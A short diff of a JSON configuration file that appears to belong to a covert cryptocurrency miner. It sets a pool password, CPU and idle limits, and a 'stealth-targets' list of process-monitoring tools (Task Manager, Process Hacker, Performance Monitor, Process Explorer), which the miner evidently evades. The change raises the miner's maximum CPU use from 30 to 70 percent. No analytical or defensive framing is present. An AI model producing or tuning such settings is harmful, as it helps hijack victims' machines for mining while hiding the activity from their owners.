@@ -6,7 +6,7 @@
     "password": "jonny",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 30,
+    "max-cpu": 70,
     "idle-wait": 5,
     "idle-cpu": 90,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
